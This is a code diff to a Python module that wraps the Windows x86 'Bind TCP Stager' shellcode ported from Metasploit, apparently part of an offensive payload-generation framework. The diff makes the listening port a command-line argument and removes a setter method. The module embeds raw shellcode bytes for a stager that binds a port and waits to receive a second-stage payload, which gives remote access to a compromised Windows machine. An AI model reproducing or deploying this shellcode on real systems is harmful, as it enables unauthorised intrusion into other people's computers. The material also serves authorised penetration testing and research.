@@ -2,15 +2,16 @@
 # https://github.com/rapid7/metasploit-framework/blob/master/modules/payloads/stagers/windows/bind_tcp.rb
 
 
-class BindTCP:
+class PayloadModule:
 
-    def __init__(self):
+    def __init__(self, cli_arguments):
         self.name = "Bind TCP Stager (Stage 1)"
         self.description = "Binds to a user provided port and listens for\
             fun files :)"
+        self.cli_name = "bind_tcp"
         self.platform = "Windows"
         self.arch = "x86"
-        self.lport = 4444
+        self.lport = int(cli_arguments.port)
         self.port_offset = 197
         self.customized_shellcode = ''
         self.stager = (
@@ -33,11 +34,6 @@ class BindTCP:
             "\x40\x68\x00\x10\x00\x00\x56\x6A\x00\x68\x58\xA4\x53\xE5\xFF\xD5" +
             "\x93\x53\x6A\x00\x56\x53\x57\x68\x02\xD9\xC8\x5F\xFF\xD5\x01\xC3" +
             "\x29\xC6\x85\xF6\x75\xEC\xC3")
-
-    def set_attrs(self, lport_value):
-        # Set the lport to be used in the payload
-        self.lport = lport_value
-        return
 
     def gen_shellcode(self):
 
